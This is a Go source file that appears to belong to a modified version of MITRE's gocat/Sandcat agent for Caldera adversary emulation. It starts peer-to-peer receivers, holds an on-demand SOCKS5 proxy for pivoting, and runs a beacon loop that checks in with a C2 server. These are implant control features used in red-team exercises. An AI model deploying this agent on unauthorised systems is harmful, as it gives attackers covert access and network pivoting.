package agent

import (
	"fmt"
	"time"

	"github.com/mitre/gocat/output"
	"github.com/mitre/gocat/proxy"
	"github.com/mitre/gocat/contact"
)

func (a *Agent) ActivateLocalP2pReceivers() {
	output.VerbosePrint("[DEBUG] Entering ActivateLocalP2pReceivers()") // ✅ Debug Log
	if !a.enableLocalP2pReceivers {
		output.VerbosePrint("[-] Local P2P receivers are disabled. Skipping initialization.")
		return
	}

	for receiverName, p2pReceiver := range proxy.P2pReceiverChannels {
		if _, exists := a.localP2pReceivers[receiverName]; exists {
			output.VerbosePrint(fmt.Sprintf("[!] p2p receiver %s is already running, skipping reinitialization.", receiverName))
			continue
		}
		if receiverName == "socks5" {
			output.VerbosePrint("[*] Initializing in-memory SOCKS5 proxy receiver...")
		}

		if err := p2pReceiver.InitializeReceiver(&a.server, &a.beaconContact, a.p2pReceiverWaitGroup, a.paw); err != nil {
			output.VerbosePrint(fmt.Sprintf("[-] Error initializing p2p receiver %s: %s", receiverName, err.Error()))
			continue
		}

		p2pReceiver.UpdateAgentPaw(a.paw)
		output.VerbosePrint(fmt.Sprintf("[DEBUG] Successfully initialized p2p receiver %s", receiverName))
		a.localP2pReceivers[receiverName] = p2pReceiver
		a.p2pReceiverWaitGroup.Add(1)
		a.storeLocalP2pReceiverAddresses(receiverName, p2pReceiver)
		// ✅ Only start non-SOCKS5 receivers immediately
		if receiverName != "socks5" {
			go p2pReceiver.RunReceiver()
		} else {
			output.VerbosePrint("[*] SOCKS5 proxy receiver is initialized but will only start on activation request.")
		}
	}

	// ✅ Register proxy activation with contact package
	contact.RegisterProxyHandlers(a.ActivateSocks5Proxy, a.DeactivateSocks5Proxy)

	// // ✅ Start beacon loop (instead of calling CheckInWithC2 from contact)
	// go a.CheckInWithC2Loop()
}

func (a *Agent) ActivateSocks5Proxy() {
    if proxy, exists := a.localP2pReceivers["socks5"]; exists {
        if proxy.IsRunning() {
            output.VerbosePrint("[!] SOCKS5 proxy is already running, skipping activation.")
            return
        }
        output.VerbosePrint("[+] Activating SOCKS5 proxy...")
        go proxy.RunReceiver()

        // ✅ Ensure the activation status updates properly
        time.Sleep(1 * time.Second) // Give it time to initialize
        if proxy.IsRunning() {
            output.VerbosePrint("[+] SOCKS5 proxy successfully activated.")
        } else {
            output.VerbosePrint("[-] SOCKS5 proxy activation failed.")
        }
    } else {
        output.VerbosePrint("[-] SOCKS5 proxy is not initialized.")
    }
}

func (a *Agent) DeactivateSocks5Proxy() {
	if proxy, exists := a.localP2pReceivers["socks5"]; exists {
		output.VerbosePrint("[*] Deactivating SOCKS5 proxy...")
		proxy.Terminate()
	} else {
		output.VerbosePrint("[-] SOCKS5 proxy is not initialized.")
	}
}

// ✅ Run beacon in a loop
func (a *Agent) CheckInWithC2Loop() {
	for {
		profile := a.GetFullProfile()
		contact.CheckInWithC2(a.server, profile, a.beaconInterval)
		time.Sleep(a.beaconInterval)
	}
}

